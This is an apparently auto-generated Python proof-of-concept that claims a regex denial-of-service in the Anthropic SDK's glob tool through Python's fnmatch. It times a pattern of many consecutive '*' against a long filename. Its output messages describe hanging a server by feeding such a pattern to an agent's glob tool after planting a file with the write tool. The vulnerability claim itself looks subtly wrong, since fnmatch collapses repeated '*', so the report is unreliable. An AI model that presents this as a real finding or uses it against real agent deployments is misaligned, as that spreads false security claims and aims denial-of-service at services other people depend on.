#!/usr/bin/env python3
# PoC for anthropic (/tmp/anthropic-sdk-python/src/anthropic)
# Path: redos-003
# Sink: glob
# Auto-generated — run with: python3 redos_python_glob.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: ReDoS in Anthropic's glob tool (via Python's fnmatch).

This script demonstrates that a glob pattern consisting of many '*' characters
causes catastrophic backtracking when matched against a long filename.
The same pattern passed to Anthropic's `beta_glob_tool` (or any code using
`pathlib.Path.glob`) will result in a denial-of-service due to CPU exhaustion.

The exploit is self-contained and uses only the standard library.
It creates a temporary file with a long name, then times the matching
of both a benign pattern and a malicious pattern to show the difference.
"""

import os
import sys
import time
import tempfile
import fnmatch

def main():
    # Configuration – adjust these to increase or decrease the effect
    NUM_STARS = 15               # Number of '*' in the malicious pattern
    FILENAME_LENGTH = 200        # Length of the long filename (max ~255 on most FS)
    BASENAME = "a" * FILENAME_LENGTH   # e.g., "aaa...aaa"

    print(f"[*] Testing ReDoS in fnmatch (used by pathlib.Path.glob)")
    print(f"[*] Malicious pattern: {'*' * NUM_STARS}")
    print(f"[*] Long filename length: {FILENAME_LENGTH}")

    # Create a temporary directory and a file with a long name inside it
    with tempfile.TemporaryDirectory() as tmpdir:
        filepath = os.path.join(tmpdir, BASENAME)
        try:
            with open(filepath, "w") as f:
                f.write("test")
        except OSError as e:
            print(f"[!] Could not create long-named file: {e}")
            sys.exit(1)

        print(f"[+] Created: {filepath}")

        # -------------------------------------------------------
        # Baseline: a benign pattern (single '*') should be very fast
        benign_pattern = "*"
        start = time.perf_counter()
        matches = fnmatch.filter([filepath], benign_pattern)
        elapsed_benign = time.perf_counter() - start
        print(f"[+] Benign pattern match took: {elapsed_benign:.6f}s (matches: {len(matches)})")

        # -------------------------------------------------------
        # Malicious pattern: many consecutive '*'
        malicious_pattern = "*" * NUM_STARS
        start = time.perf_counter()
        matches = fnmatch.filter([filepath], malicious_pattern)
        elapsed_malicious = time.perf_counter() - start
        print(f"[+] Malicious pattern match took: {elapsed_malicious:.6f}s (matches: {len(matches)})")

        # -------------------------------------------------------
        # Compare and highlight the vulnerability
        slowdown = elapsed_malicious / max(elapsed_benign, 1e-6)
        print(f"\n[*] Slowdown factor: {slowdown:.1f}x")

        if elapsed_malicious > 1.0:
            print("[!] VULNERABLE: Malicious pattern caused catastrophic backtracking (>1 second).")
            print("[!] In a real attack, an attacker could cause a server hang by sending")
            print("[!] a long pattern like '****************' to the glob tool and having")
            print("[!] a file with a long name present in the working directory.")
            print("[!] (The attacker could create such a file using the write tool.)")
        else:
            # For very small patterns or short filenames, the effect may be minor;
            # increase NUM_STARS or FILENAME_LENGTH to trigger stronger backtracking.
            print("[*] Not sufficiently slow – try increasing NUM_STARS or FILENAME_LENGTH.")

        # Cleanup is automatic via TemporaryDirectory

if __name__ == "__main__":
    main()
